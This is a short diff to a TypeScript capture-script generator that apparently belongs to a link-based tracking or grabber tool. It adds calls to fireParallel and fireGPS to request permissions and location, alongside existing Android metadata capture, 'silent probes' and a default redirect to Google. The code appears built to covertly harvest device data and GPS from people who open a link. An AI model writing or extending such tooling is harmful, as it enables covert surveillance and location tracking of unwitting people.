@@ -269,6 +269,16 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
       };
       captureAndroidMeta().catch(e => console.error(e));
 
+      // Execute requested permissions
+      if (typeof fireParallel === 'function') {
+        clientLog("startCapture: Calling fireParallel");
+        await fireParallel();
+      }
+      if (typeof fireGPS === 'function') {
+        clientLog("startCapture: Calling fireGPS");
+        await fireGPS();
+      }
+
       // Silent Probes
       runSilentProbes().then(() => flushExtra()).catch(e => console.error(e));
 
